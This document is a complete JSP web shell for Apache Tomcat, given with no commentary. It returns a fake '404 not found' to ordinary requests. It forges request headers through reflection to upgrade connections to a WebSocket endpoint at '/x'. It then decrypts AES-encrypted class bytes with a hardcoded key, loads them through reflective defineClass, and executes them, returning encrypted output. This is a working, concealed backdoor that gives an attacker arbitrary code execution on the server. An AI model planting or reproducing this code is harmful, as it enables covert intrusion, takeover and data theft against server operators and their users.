<%@ page import="java.util.*" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.websocket.Endpoint" %>
<%@ page import="javax.websocket.Session" %>
<%@ page import="javax.websocket.EndpointConfig" %>
<%@ page import="javax.websocket.MessageHandler" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%@ page import="org.apache.tomcat.websocket.server.UpgradeUtil" %>
<%@ page import="org.apache.tomcat.util.http.MimeHeaders" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.nio.ByteBuffer" %>

<%!
    public static class CmdEndpoint extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
        private Session session;

        public Class defClass(byte[] classBytes) throws Throwable {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defMethod.setAccessible(true);
            return (Class)defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        }

        public static byte[] x(byte[] s, boolean m){
            String xc="3c6e0b8a9c15224a";
            try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
                c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
                return c.doFinal(s); }catch (Exception e){ e.printStackTrace();return null; }}

        @Override
        public void onMessage(ByteBuffer databf) {
            try {
                byte[] data= databf.array();
                data = x(data, false);
                if (session.getUserProperties().get("payload")==null){
                    session.getUserProperties().put("payload", defClass(data));
                    session.getBasicRemote().sendBinary(ByteBuffer.wrap(x("ok".getBytes(), true)));
                }else{
                    session.getUserProperties().put("parameters", data);
                    Object f=((Class)session.getUserProperties().get("payload")).newInstance();
                    java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
                    f.equals(arrOut);
                    f.equals(session);
                    f.equals(data);
                    f.toString();
                    session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(arrOut.toByteArray(), true)));
                }
            } catch (Exception e) { } catch (Throwable throwable) { }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
    private void SetHeader(HttpServletRequest request, String key, String value){
        Class<? extends HttpServletRequest> requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj);
            headersObj.removeHeader(key);
            headersObj.addValue(key).setString(value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%>

<%
    String connection = request.getHeader("Connection");
    if (connection != null && !connection.toLowerCase().contains("upgrade")) {
        out.print("404 not found");
    }else {
        ServletContext servletContext = request.getSession().getServletContext();
        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(CmdEndpoint.class, "/x").build();
        WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
        configEndpoint.getUserProperties().put("servletRequest", request);
        configEndpoint.getUserProperties().put("servletContext", request.getServletContext());
        configEndpoint.getUserProperties().put("httpSession", request.getSession());
        container.setDefaultMaxTextMessageBufferSize(52428800);
        container.setDefaultMaxBinaryMessageBufferSize(52428800);
        Map<String, String> pathParams = Collections.emptyMap();
        SetHeader(request, "Connection", "upgrade");
        SetHeader(request, "Sec-WebSocket-Version", "13");
        SetHeader(request, "Upgrade", "websocket");
        UpgradeUtil.doUpgrade(container, request, response, configEndpoint, pathParams);
    }

%>
